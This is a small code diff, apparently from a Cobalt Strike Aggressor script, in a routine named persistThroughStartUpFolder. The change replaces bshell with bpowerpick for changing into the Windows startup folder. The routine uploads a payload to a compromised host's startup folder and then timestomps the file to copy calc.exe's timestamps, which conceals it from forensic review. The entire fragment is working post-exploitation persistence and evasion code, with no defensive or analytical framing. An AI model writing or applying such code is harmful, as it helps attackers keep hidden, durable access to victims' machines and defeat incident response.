@@ -11,7 +11,7 @@ sub persistThroughStartUpFolder {
 			break;
 		}
 		else {
-			bshell($bid, 'cd "'.$3['startup'].'"');
+			bpowerpick($bid, 'cd "'.$3['startup'].'"');
 			bupload($bid, $3['payload']);
 			btimestomp($bid, "$3['payload']", "c:\\windows\\system32\\calc.exe");	
 		}
